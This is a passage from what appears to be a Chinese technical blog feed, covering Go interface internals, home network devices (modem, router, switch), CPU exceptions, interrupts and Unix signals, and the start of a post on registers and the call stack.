<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> p *<span class="keyword">int</span></span><br><span class="line">    fmt.Println(p == <span class="literal">nil</span>)   <span class="comment">// true，指针的零值为 nil</span></span><br><span class="line">    fmt.Println(testNil(p)) <span class="comment">// false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">testNil</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> v == <span class="literal">nil</span> <span class="comment">// 总是 false，因为 interface&#123;&#125; 永远不为 nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>Go 编译器将接口按照有无方法分为两种结构体来表示：有方法的接口表示为 <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L203">runtime.iface</a>，无方法的空接口表示为 <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L208">runtime.eface</a>。这些结构由编译器在编译期生成</p>
<h3 id="无方法接口及-eface"><a href="#无方法接口及-eface" class="headerlink" title="无方法接口及 eface"></a>无方法接口及 eface</h3><p>因为空接口比较简单，所以 <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L208">runtime.eface</a> 的成员也少：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> eface <span class="keyword">struct</span> &#123; <span class="comment">// 16 字节</span></span><br><span class="line">    _type *_type</span><br><span class="line">    data  unsafe.Pointer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>_type</code> 表示原对象的类型元信息</li>
<li><code>data</code> 是一个指向原对象的指针</li>
</ul>
<p><a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L208">runtime.eface</a> 是对原对象进行一层简单的封装，通过 <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/type.go#L31">runtime._type</a> 保留了原对象类型的运行时元信息：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> _type <span class="keyword">struct</span> &#123;</span><br><span class="line">    size       <span class="keyword">uintptr</span></span><br><span class="line">    ptrdata    <span class="keyword">uintptr</span></span><br><span class="line">    hash       <span class="keyword">uint32</span></span><br><span class="line">    tflag      tflag</span><br><span class="line">    align      <span class="keyword">uint8</span></span><br><span class="line">    fieldAlign <span class="keyword">uint8</span></span><br><span class="line">    kind       <span class="keyword">uint8</span></span><br><span class="line">    equal      <span class="function"><span class="keyword">func</span><span class="params">(unsafe.Pointer, unsafe.Pointer)</span> <span class="title">bool</span></span></span><br><span class="line">    gcdata     *<span class="keyword">byte</span></span><br><span class="line">    str        nameOff</span><br><span class="line">    ptrToThis  typeOff</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>size</code> 表示类型大小，分配内存的时候要用到</li>
<li><code>hash</code> 是类型的哈希值，通常用于快速确定两个类型是否相同</li>
<li><code>equal</code> 用来判断一个类型的两个对象是否相等</li>
<li><code>align</code> 用来确定这个类型的字节对齐边界</li>
</ul>
<p>总而言之，<a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/type.go#L31">runtime._type</a> 包含了与“如何描述一个类型”有关的信息。</p>
<p>对空接口赋值后的数据结构表示如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Binary <span class="keyword">uint64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    b := Binary(<span class="number">200</span>)</span><br><span class="line">    any := (<span class="keyword">interface</span>&#123;&#125;)(b)</span><br><span class="line">    fmt.Println(any)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/12/26/WajYNX2scv8O4i6.png" alt="空接口"></p>
<h3 id="有方法接口及-iface"><a href="#有方法接口及-iface" class="headerlink" title="有方法接口及 iface"></a>有方法接口及 iface</h3><p><a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L203">runtime.iface</a> 不仅有指向原数据的 <code>data</code> 字段，还有 <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L857">runtime.itab</a> 类型的 <code>tab</code> 字段：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> iface <span class="keyword">struct</span> &#123; <span class="comment">// 16 字节</span></span><br><span class="line">    tab  *itab</span><br><span class="line">    data unsafe.Pointer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L857">runtime.itab</a> 是 <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L203">runtime.iface</a> 的核心字段，是具体类型和接口类型的结合，可以看作结构体把某种接口类型和某种具体类型联系在一起:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> itab <span class="keyword">struct</span> &#123; <span class="comment">// 32 字节</span></span><br><span class="line">    inter *interfacetype <span class="comment">// 接口类型信息</span></span><br><span class="line">    _type *_type         <span class="comment">// 具体类型信息 </span></span><br><span class="line">    hash  <span class="keyword">uint32</span>         <span class="comment">// _type.hash 的副本，用于快速判断接口的具体类型</span></span><br><span class="line">    _     [<span class="number">4</span>]<span class="keyword">byte</span></span><br><span class="line">    fun   [<span class="number">1</span>]<span class="keyword">uintptr</span>    <span class="comment">// 底层数组，存储接口的方法集的具体实现的地址，其包含一组函数指针，实现了接口方法的动态分派，且每次在接口发生变更时都会更新</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/type.go#L366">runtime.interface</a> 类似于 <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/type.go#L31">runtime._type</a>，是对某种接口的描述：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> nameOff <span class="keyword">int32</span></span><br><span class="line"><span class="keyword">type</span> typeOff <span class="keyword">int32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> imethod <span class="keyword">struct</span> &#123;</span><br><span class="line"> name nameOff</span><br><span class="line"> ityp typeOff</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> interfacetype <span class="keyword">struct</span> &#123;</span><br><span class="line"> typ     _type      <span class="comment">// 接口的具体类型信息</span></span><br><span class="line"> pkgpath name       <span class="comment">// 接口的包（package）名信息</span></span><br><span class="line"> mhdr    []imethod  <span class="comment">// 接口所定义的函数列表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对有方法接口赋值后的数据结构表示如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Binary <span class="keyword">uint64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i Binary)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> strconv.FormatUint(i.Get(), <span class="number">10</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i Binary)</span> <span class="title">Get</span><span class="params">()</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">uint64</span>(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    b := Binary(<span class="number">200</span>)</span><br><span class="line">    s := fmt.Stringer(b) <span class="comment">// fmt.Stringer 是一个仅包含 String() string 的接口</span></span><br><span class="line">    fmt.Println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/12/26/dwSRrUA2VOBu8XW.png" alt="有方法接口"></p>
<h2 id="eface-和-iface-的区别"><a href="#eface-和-iface-的区别" class="headerlink" title="eface 和 iface 的区别"></a>eface 和 iface 的区别</h2><p><img src="https://i.loli.net/2021/01/21/6EYlosW1LPg7IXu.png" alt="eface和iface"></p>
<p>所有接口的数据结构都有一个指向具体数据的的指针，这也就是为什么接口变量必须初始化。然后根据这个接口有没有方法决定是否产生把具体类型和接口类型组合成一个 itab</p>
<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>Go 方法的接收者可以是指针也可以是结构体，所以既可以是指针实现了某接口，也可以是结构体实现了某接口，但是只能二选一，如果结构体和其指针实现了同一接口，编译器会报错“method redeclared”：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Tester <span class="keyword">interface</span>&#123;</span><br><span class="line">    test()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">结构体做接收者的接口，用结构体或指针初始化都是可以的</span></span><br><span class="line"><span class="comment">func (p Person) test() &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">func main() &#123;</span></span><br><span class="line"><span class="comment">    var t1 Tester = P&#123;&#125;</span></span><br><span class="line"><span class="comment">    var t2 Tester = &amp;P&#123;&#125;</span></span><br><span class="line"><span class="comment">    t1.test()</span></span><br><span class="line"><span class="comment">    t2.test()</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">指针做接收者的接口，只能用指针初始化</span></span><br><span class="line"><span class="comment">func (p *Person) test() &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">func main() &#123;</span></span><br><span class="line"><span class="comment">    var t1 Tester = &amp;P&#123;&#125;</span></span><br><span class="line"><span class="comment">    t1.test()</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>结构体实现接口，使用结构体对象进行接口变量初始化；指针实现接口，使用指针对象进行接口变量初始化，这都是顺其自然的。反常的是用结构体实现接口可以用指针对象初始化接口变量和用指针实现接口不能用结构体对象初始化接口变量。</p>
<p>这是因为 Go 传参时统一使用“值传递”。所谓“接收者”本质上也是一个参数，编译器翻译时会复制参数到帧顶。无论上述代码中初始化变量 t1 的是 P{} 还是 &amp;P{}，使用 t1.test() 时都会发生值拷贝</p>
<p>如果是结构体实现接口而用指针初始化，调用时编译器拷贝指针，方法栈帧中通过 <code>*</code> 操作就可以得到原结构体并执行其方法；而如果是指针实现接口而用结构体初始化，调用时编译器只能拷贝结构体，即使在背后使用 <code>&amp;</code> 也无法得到指向原结构体的指针。</p>
<h2 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h2><p>有时候我们需要确定某个接口变量的具体类型，就需要用到类型断言。类型断言可以把接口类型转为具体类型：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Tester <span class="keyword">interface</span>&#123;</span><br><span class="line">    test()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span> <span class="title">test</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t Tester = P&#123;&#125;</span><br><span class="line">    <span class="keyword">switch</span> x := t.(<span class="keyword">type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> Person:     <span class="comment">// 这里 x 是 Person 类型</span></span><br><span class="line">        <span class="keyword">case</span> Cat, <span class="keyword">int</span>:  <span class="comment">// 这里 x 是 interface&#123;&#125; 类型</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面说过无论是 <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L203">runtime.iface</a> 还是 <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L208">runtime.eface</a> 都有个 <code>hash</code> 字段标识接口的具体类型，类型断言时编译器把这个字段和目标类型的哈希值进行比较就知道两个类型是否相同了。</p>
<p>参考：</p>
<p><a href="https://draveness.me/golang/">Go语言设计与实现</a></p>
<p><a href="https://i6448038.github.io/2018/10/01/Golang-interface/">Go语言interface底层实现</a></p>
<p>《Go程序设计语言》第七章</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>大话光猫，路由器与交换机</title>
    <url>/2020/12/21/%E5%85%89%E7%8C%AB%EF%BC%8C%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%9C%BA/</url>
    <content><![CDATA[<p>生活中最常见的网络设备就是光猫和路由器了。一些较大型的企业可能还会用到交换机。以家庭上网为例，数据从光纤到达个人设备的流程是这样的：</p>
<p><img src="https://i.loli.net/2020/12/21/fD5YlTFmNaG49hq.png" alt="边缘网络模型.png"></p>
<h2 id="光猫"><a href="#光猫" class="headerlink" title="光猫"></a>光猫</h2><p>现在光纤入户已经很普及了，顾名思义光纤是通过光信号来传输信息的，而我们的终端设备只能处理电信号，那么如何处理从光信号到电信号的转换呢？答案就是光猫(modem)，通俗地讲，光猫就是一种负责光电转换的设备。由于光纤宽带有两种技术模式：一种是 EPON 接入，另一种是 GPON 接入，所以光猫也分为 EPON 光猫和 GPON 光猫。</p>
<p>由于不同地区、不同运营商往往用的都是不同的光纤技术，所以每个地区每个运营商对应的光猫一般也不同，比如一个光猫在湖南联通能正常工作，而在广东移动可能就无法使用了。所幸在光纤入户的时候运营商会赠送一个对应的光猫。如果要自己在市场上购买光猫，一定要注意地区与运营商的限制。</p>
<p><img src="https://i.loli.net/2020/12/21/z8lVmEKRaeQZr7H.jpg" alt="猫.jpg"></p>
<p>一般来说，在猫背面的标签上都会标明了设备的名称、型号以及其它参数。由于光猫一般都是网络运营商配送的，所以光猫的标签上除了设备型号和参数外，通常还标有网络运营商的标志或LOGO等</p>
<p><img src="https://i.loli.net/2020/12/21/3iSzyBoACfYHWnj.jpg" alt="猫底.jpg"></p>
<p><img src="https://i.loli.net/2020/12/21/WuJfjkxUBtoanQY.jpg" alt="猫背.jpg"></p>
<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>如今各种联网设备越来越多，常见的就有手机、电脑、ipad，还有各种各样的智能家电。仅靠一个光猫是无法满足这么多设备的联网需求的（端口不够），而且通常也无法实现无线上网（当然现在有光猫和路由器一体的机器，这里不做讨论）。这就要用到路由器(router)了。</p>
<p>专业上来说，路由器是位于网络层的设备，负责在多个网络之间传输数据包。路由器内部维护了一张路由表，根据路由表和一些算法决定把数据包发往何处；可以给局域网分配 ip ，即把一个公有 ip 地址转换为多个私有 ip 地址；另外还会提供防火墙功能。</p>
<p>通俗地讲，有了路由器我们就可以实现多台设备共用一个运营商账号，并且使用所谓“WiFi”进行无线上网。</p>
<p><img src="https://i.loli.net/2020/12/21/Ag54uVlcSZy8ztf.png" alt="路由器.png"></p>
<p><img src="https://i.loli.net/2020/12/21/oEtXeQFVPu6MLz9.png" alt="image.png"></p>
<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>交换机对于家庭用户而言可能比较陌生，因为它是为多设备互联而生的。就像前面所说，如果在一个公司里有上百台设备要联网，这时候路由器也不够用了，就需要使用交换机(switch)。</p>
<p>交换机就是在多个端口之间交换数据，与路由器不同，它是一个链路层的设备，通过判断 MAC 地址来决定数据发往哪台设备。它不具有分配 ip、防火墙等功能，仅负责在端口之间交换数据包，就像是十字路口的交警，在局域网内对数据流转起到一个指挥作用。</p>
<p>交换机全部接口都是一样的，没有 WLAN 口和 VLAN 口之分。一般情况下，当路由器的网口不够用的时候，可以再接入一个交换机来扩展网口。从无线路由器的 VLAN 口上接一条网线到交换机任意接口，然后从交换机的其他接口可以接到电脑等设备上。</p>
<p><img src="https://i.loli.net/2020/12/21/aPJUZMH8Fen5rhg.png" alt="交换机.png"></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>异常、中断与信号</title>
    <url>/2020/12/12/%E5%BC%82%E5%B8%B8%E3%80%81%E4%B8%AD%E6%96%AD%E4%B8%8E%E4%BF%A1%E5%8F%B7/</url>
    <content><![CDATA[<p>任何一个通用 CPU 都可以在执行完一条指令后检测从 CPU 外部发送过来或从内部产生的一种特殊信息，并且可以立即转而对该信息进行处理。这种“特殊信息”衍生出了异常、中断和信号这三个概念，其中牵涉到的知识点非常广泛且复杂，环环相扣。本文旨在对其进行梳理，形成一个脉络，具体底层细节还需要读者自行探究。</p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote>
<p>中断（又称异步中断、硬中断）: 本质是一种电信号。当设备有某种事件发生时，它就会产生中断，通过总线把电信号发送给中断控制器（如 8259A）。如果中断的线是激活的，中断控制器就把电信号发送给处理器的某个特定引脚。处理器于是立即停止自己正在做的事，跳到中断处理程序的入口点，进行中断处理。</p>
</blockquote>
<blockquote>
<p>异常（又称同步中断，软中断）：由指令产生，如 div 指令中除数为 0 就会引发一个除零异常。异常是可以预期的，通过观察程序的指令就可以知道什么时候会产生什么异常。</p>
</blockquote>
<p>中断和异常都是用称为 <code>中断类型码</code> 来表示中断信息的来源。中断类型码是一个字节型数据，可以表示 256 种来源。</p>
<blockquote>
<p>信号：信号是软件层面上对中断的模拟，用来通知进程发生了异步事件。进程之间可以通过系统调用发送软中断信号。内核也可以因为内部事件给进程发送信号，通知进程发生了某个事件。注意，信号只是用来通知某进程发生了什么事件，并不给该进程传递任何数据</p>
</blockquote>
<h2 id="异常与中断"><a href="#异常与中断" class="headerlink" title="异常与中断"></a>异常与中断</h2><p>我们先来看看异常。刚才说到，异常由指令触发，也就是代表了来自程序内部的某些行为，这些行为总体可以分为四类：</p>
<ol>
<li>除法错误，如除零。类型码：0</li>
<li>单步执行。类型码：1</li>
<li>执行 into 指令。类型码：4</li>
<li>执行 int n 指令。类型码：n</li>
</ol>
<p>异常处理流程：</p>
<ol>
<li>异常发生，控制单元产生一个对应的类型码</li>
<li>CPU 根据这个类型码从中断向量表(idt, interrupt description table) 找到异常处理处理程序入口</li>
<li>保存当前程序现场，切换到对应异常处理程序</li>
<li>异常处理程序最后向进程发送一个信号 SIGXXX，记录在进程的 PCB 里</li>
<li>如果进程自定义了该信号的处理程序，跳去执行它；否则执行内核预定义的行为</li>
</ol>
<p><img src="https://i.loli.net/2020/12/13/g6Z8DEmK7XjsPJB.png" alt="异常处理流程.png"></p>
<p><strong>异常都是不可屏蔽的，CPU 必须对此做出响应。</strong></p>
<p>再来看中断。当 CPU 外部有需要处理的事情发生（如外设输入输出等），中断控制器会向 CPU 发出对应的中断类型码，引发中断过程。中断又可以分为两类：</p>
<ol>
<li>可屏蔽中断：CPU 可以不响应这个中断。而具体响不响应要看标志寄存器的 IF 位。IF = 1 时 CPU 执行完当前指令后响应中断，IF = 0 则不响应。多数由 IO 引发的中断都是可屏蔽的。</li>
<li>不可屏蔽中断：CPU 必须响应的中断。CPU 执行完当前指令后立刻引发中断过程。它的类型码固定为 2。存储器校验出错，I/O 通道校验出错等都属于不可屏蔽中断。</li>
</ol>
<p>中断处理流程：</p>
<ol>
<li>设备产生中断，PIC(可编程中断控制器)产生一个对应的类型码</li>
<li>CPU 根据这个类型码从中断向量表(idt, interrupt description table) 找到异常处理处理程序入口</li>
<li>保存当前程序现场，切换到对应异常处理程序</li>
<li>中断处理程序进行保存现场，做相关处理，恢复现场</li>
<li>内核调度，返回用户进程</li>
</ol>
<p><img src="https://i.loli.net/2020/12/13/Ra5TtVXK2YmjzPG.png" alt="中断处理流程.png"></p>
<p>现代操作系统把中断处理程序从概念上被分为<code>上底（top half）</code>和<code>下底（bottom half）</code>。在中断发生时上半部分的处理过程立即执行，但是下半部分（如果有的话）却推迟执行。内核把上半部分和下半部分作为独立的函数来处理，上半部分决定其相关的下半部分是否需要执行。必须立即执行的部分必须位于上半部分，而可以推迟的部分可能属于下半部分。两者通过软中断衔接。比如，网卡接收数据的过程中，首先网卡发送中断信号告诉 CPU 来取数据并用 DMA 技术把数据包写入内存，然后 CPU 调用网卡驱动先禁用网卡中断，再把原始数据包解析成协议栈对应的格式，最后送入各层依次解析。这些如果都让中断处理程序来处理显然过程太长，造成新来的中断阻塞。因此 Linux 将这种任务分为两个部分，一个叫上底，即中断处理程序，短平快地处理与硬件相关的操作（如禁用网卡中断）；而把对时间要求相对宽松的任务（如解析数据的工作）放在另一个部分执行。</p>
<p>为什么要这样划分为两部分呢？</p>
<ol>
<li>把中断的总延迟时间最小化。Linux 内核定义了两种类型的中断，快速的和慢速的，这两者之间的一个区别是慢速中断自身还可以被中断，而快速中断则不能。因此，当处理快速中断时，如果有其它中断到达；不管是快速中断还是慢速中断，它们都必须等待。为了尽可能快地处理这些其它的中断，内核就需要尽可能地将处理延迟到下半部分执行。</li>
<li>当内核执行上半部分时，正在服务的这个特殊IRQ将会被可编程中断控制器禁止，于是，连接在同一个 IRQ 上的其它设备就只有等到该该中断处理被处理完毕后果才能发出 IRQ 请求。而采用 Bottom_half 机制后，不需要立即处理的部分就可以放在下半部分处理，从而，加快了处理机对外部设备的中断请求的响应速度。</li>
<li>处理程序的下半部分还可以包含一些并非每次中断都必须处理的操作；对这些操作，内核可以在一系列设备中断之后集中处理一次就可以了。即在这种情况下，每次都执行并非必要的操作完全是一种浪费，而采用 Bottom_half 机制后，可以稍稍延迟并在后来只执行一次就行了。</li>
</ol>
<h3 id="二者的关系"><a href="#二者的关系" class="headerlink" title="二者的关系"></a>二者的关系</h3><p>异常和中断最主要的区别在于前者由指令触发，根据指令给出类型码，后者由 PIC 与 CPU 引脚之间的连线触发，从数据线上取得类型码。其次，异常都是不可屏蔽的，而中断分为可屏蔽与不可屏蔽两种。</p>
<p>现在通过数据包从 <em>网卡 -&gt; 内存 -&gt; 网络模块 -&gt; 协议栈</em> 这个过程示范一下中断处理程序是怎么利用硬中断与异常完成工作的：</p>
<p><img src="https://i.loli.net/2020/12/14/9xbd6e4Ekp72GKC.png" alt="上底处理流程.png"></p>
<p><img src="https://i.loli.net/2020/12/14/LPI1l5CsuNMmXak.png" alt="下底处理流程.png"></p>
<h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><p>我们在运行一个 shell 程序的时候，往往按下 Ctrl+C 就可以强制退出。按下组合键的过程就是操作系统给进程发送了一个信号：</p>
<ol>
<li>松开按键后键盘会产生一个中断，如果 CPU 正在执行这个进程的代码则该进程的用户代码先暂停执行，用户从用户态切换到内核态去处理中断</li>
<li>键盘驱动程序检测到按下的是 ctrl+c，将这一对组合键翻译成一个 SIGINT 信号记在该进程的 PCB 中（也就是发送了一个 SIGINT 信号给该进程）</li>
<li>在从内核态回到用户态继续执行进程的用户代码之前，首先要处理 PCB 中的信号，这是发现有一个 SIGINT 要处理，而这个信号的在内核默认处理的方式是终止进程，所以直接终止进程，不再返回用户空间执行代码</li>
</ol>
<p>在 bash 执行 <code>kill -l</code> 可以看到所有信号及其编号：<br><img src="https://i.loli.net/2020/12/13/aCFM9hEjfIQX3Tw.png" alt="image.png"></p>
<p>产生信号的方式：</p>
<ol>
<li>按下某些组合键。如 Ctrl+C 产生 SIGINT，Ctrl+/ 产生 SIGQUIT ，Ctrl+Z 产生 SIGTSTP。</li>
<li>异常产生信号。由硬件检测到并通知内核，然后内核向当前进程发送适当的信号。例如当前进程执行指令 div 0，CPU 的运算单元会产生异常，内核将这个异常解释为 SIGFPE 信号发送给进程；再比如当前进程访问了非法内存地址，MMU 会产生异常，内核将这个异常解释为 SIGSEGV 信号发送给进程。</li>
<li>进程通过系统调用 kill 函数给另一个进程发送信号。</li>
<li>通过 kill 命令给某个进程发送信号（内部也是通过系统调用 kill 函数实现的）</li>
<li>某种特定的软件行为产生信号。如向读端已关闭的管道写数据时产生 SIGPIPE 信号，时钟函数 alarm 超时产生 SIGALRM 信号</li>
</ol>
<p>举个例子，用 alarm 函数设定一个闹钟，告诉内核在 2 秒后给当前进程发送一个 SIGALRM 信号，该信号的默认处理动作是终止当前进程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">    alarm(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> (; ; count++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;count = %d\n&quot;</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，时钟超时前一直在对 count 进行计数，2s 后进程收到 SIGALRM 信号终止。<br><img src="https://i.loli.net/2020/12/13/vAwGdTbNH8lOSg5.png" alt="image.png"></p>
<p>下图总结了信号的捕获过程。与中断不同，应用层面的开发者是可以控制程序收到信号后的行为的：</p>
<p><img src="https://i.loli.net/2020/12/13/NRnovw1bMuG3xzs.png"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/flowing_wind/article/details/79967588">Linux进程信号详解</a></p>
<p><a href="https://www.cnblogs.com/charlesblc/p/6277810.html">信号和中断的比较+中断和异常的比较</a></p>
<p>《深入理解计算机系统》第 8 章：异常控制流</p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>异常处理</tag>
      </tags>
  </entry>
  <entry>
    <title>函数调用背后的秘密——寄存器与栈</title>
    <url>/2020/11/21/%E4%BB%8EBP%E4%B8%8ESP%E8%AF%B4%E5%BC%80%E5%8E%BB/</url>
    <content><![CDATA[<p>函数调用是解耦思想的一个基本体现。为了实现调用，我们往往需要给子程序提供一些参数并得到子程序的执行结果。今天就来探究一下这个过程在计算机内部是如何实现的。</p>
<h2 id="程序内存模型"><a href="#程序内存模型" class="headerlink" title="程序内存模型"></a>程序内存模型</h2><p>下图展示了 x86-64 平台 Linux 系统的程序内存分布模型。OS 只使用了低 47 位作为内存地址，所以可以看到内存地址最大值为 <code>0x00007FFFFFFFFFF</code>：</p>
<ol>
<li>前 FFFFFFF 个字节存放共享库，如 <code>stdio.h</code>、 <code>iostream</code> 等都在这里</li>
<li>随后为大小最多 8M 的运行时栈。局部变量、程序状态信息等值往往保存其中。sp 减小，栈增大；sp 增大，栈减小并释放栈帧中的内容</li>
<li>堆空间的申请与释放由程序员手动管理</li>
<li>Data 区保存全局数据，通常是常量</li>
<li>Text 区存放程序指令，sp 指针就在这块区域中来回移动</li>
<li>低 400000 字节通常不会被分配给程序</li>
</ol>
<p><img src="https://i.loli.net/2020/12/01/tpiUYdgbZxEBVvm.png" alt="image.png"></p>
<p>**sp(stack pointer)**，中文名“栈顶寄存器”。顾名思义，这个指针时刻指向栈的顶部，其值随 push 和 pop 操作隐式改变。假设操作对象为 x：</p>
<ul>
<li>push x：首先，sp -= len(x)（x 的字长，以字节为单位）；然后，在 [sp-len(x), sp) 中存入 x 值。</li>
